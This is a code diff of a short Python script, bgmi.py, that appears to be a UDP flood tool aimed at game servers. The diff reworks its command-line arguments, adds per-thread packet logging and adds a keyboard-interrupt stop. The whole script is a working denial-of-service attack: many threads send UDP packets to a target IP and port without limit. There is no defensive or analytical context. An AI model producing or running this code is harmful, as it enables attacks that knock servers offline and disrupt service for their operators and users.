@@ -1,29 +1,40 @@
 #!/usr/bin/env python3
-import sys, socket, threading
+import sys, socket, threading, time
+
+if len(sys.argv) < 5:
+    print("Usage: python3 bgmi.py <IP> <PORT> <PACKET_SIZE> <THREADS>")
+    sys.exit(1)
 
 IP = sys.argv[1]
 PORT = int(sys.argv[2])
-NUM_PACKETS = int(sys.argv[3])
-PACKET_SIZE = int(sys.argv[4])
-NUM_THREADS = int(sys.argv[5])
+PACKET_SIZE = int(sys.argv[3])
+NUM_THREADS = int(sys.argv[4])
 
 data = bytearray(PACKET_SIZE)
-stop_flag = [False]  # dùng để tắt spam nếu cần
+stop_flag = [False]
 
-def spam():
+def spam(thread_id):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sent_count = 0
     while not stop_flag[0]:
-        for _ in range(NUM_PACKETS):
-            try:
-                s.sendto(data, (IP, PORT))
-            except:
-                pass
+        try:
+            s.sendto(data, (IP, PORT))
+            sent_count += 1
+            if sent_count % 100 == 0:
+                with open("bgmi_log.txt", "a") as f:
+                    f.write(f"Thread {thread_id}: Sent {sent_count} packets to {IP}:{PORT}\n")
+        except Exception:
+            pass
 
 threads = []
-for _ in range(NUM_THREADS):
-    t = threading.Thread(target=spam)
+for i in range(NUM_THREADS):
+    t = threading.Thread(target=spam, args=(i,))
     t.start()
     threads.append(t)
 
-for t in threads:
-    t.join()
+try:
+    for t in threads:
+        t.join()
+except KeyboardInterrupt:
+    stop_flag[0] = True
+    print("Stopped by user")
